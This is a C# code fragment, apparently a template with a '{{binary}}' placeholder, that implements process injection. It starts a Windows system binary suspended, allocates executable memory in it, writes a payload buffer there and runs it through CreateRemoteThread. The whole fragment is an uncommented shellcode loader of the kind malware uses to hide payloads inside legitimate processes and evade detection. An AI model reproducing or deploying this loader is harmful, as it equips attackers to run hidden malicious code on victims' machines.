			string binary = "{{binary}}";
			IntPtr size = new IntPtr(mydata.Length);
            StartupInfo sInfo = new StartupInfo();
            sInfo.dwFlags = 0;
            ProcessInformation pInfo;
            string binaryPath = "";

            if (Environment.GetEnvironmentVariable("ProgramW6432").Length > 0)
            {
                binaryPath = Environment.GetEnvironmentVariable("windir") + "\\SysWOW64\\" + binary;
            }
            else
            {
                binaryPath = Environment.GetEnvironmentVariable("windir") + "\\System32\\" + binary;
            }
            IntPtr funcAddr = CreateProcessA(binaryPath, null, null, null, true, CreateProcessFlags.CREATE_SUSPENDED, IntPtr.Zero, null, sInfo, out pInfo);
            IntPtr hProcess = pInfo.hProcess;
            if (hProcess != IntPtr.Zero)
            {
                IntPtr spaceAddr = VirtualAllocEx(hProcess, new IntPtr(0), size, AllocationType.GO, MemoryProtection.EXECUTE_READWRITE);
                if (spaceAddr == IntPtr.Zero)
                {
                    TerminateProcess(hProcess, 0);
                }
                else
                {
                    int test = 0;
                    IntPtr size2 = new IntPtr(mydata.Length);
                    bool bWrite = WriteProcessMemory(hProcess, spaceAddr, mydata, size2, test);
                    CreateRemoteThread(hProcess, new IntPtr(0), new uint(), spaceAddr, new IntPtr(0), new uint(), new IntPtr(0));

                }
            }